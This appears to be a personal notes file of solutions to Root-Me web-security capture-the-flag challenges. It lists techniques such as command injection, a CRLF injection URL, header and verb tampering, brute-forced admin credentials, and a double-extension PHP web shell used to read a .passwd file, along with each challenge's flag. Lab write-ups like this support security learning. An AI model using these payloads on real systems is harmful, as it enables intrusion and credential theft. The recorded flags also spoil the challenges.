1. HTML: View Source 
	>>> nZ^&@q5&sjJHev0


2. HTTP - Open redirect: lv2: use burpsuite to intercrept: 
http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134
change into: http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f 	<h = MD5(https://)>
	>>>e6f8a530811d5a479812d7b82fc1a5c5

3. Command injection - Ping service v1: use command: grep flag index.php
	>>>$flag = "S3rv1ceP1n9Sup3rS3cure"



4. Weak password : user & pw = admin (bruzzforce)
	>>>admin


5. User-agent: change user-agent header = admin
	>>>rr$Li9%L34qd1AAe27


6. Backup file: change url : http://challenge01.root-me.org/web-serveur/ch11/index.php~
	download index.php_ >>see user and pw
	>>>OCCY9AcNm1tj


7. HTTP directory indexing: ctrl + U>> add path admin/pass.html in url >>> /admin/ >>pass.txt
	>>>LINUX


8. HTTP Headers: use burp to add Header-RootMe-Admin = 1 to http headers
	>>>HeadersMayBeUseful



9. HTTP verb tampering: USE Burp: change method GET> OPTIONS:
	>>>a23e$dme96d3saez$$prap


10. Install file: enter link: http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php
	>>>karambar



11. Improper redirect: US burp: GET /web-serveur/ch32/
	>>>ExecutionAfterRedirectIsBad


12. CRLF: change URL: http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0d%0aadmin&password=admin%20authenticated.%0d%0aadmin
	>>>rFSP&G0p&5uAg1%


13. File upload - double extensions: creat a shell.php allow inject command in url, change name to shell.php.png(or other ext) then upload it. 	
	****ADD Command: ?command=<command>
		get flag: ?command=cat../../../.passwd (i use burp to change value of command)
	>>>Gg9LRz-hWSxqqUKd77-_q-6G8




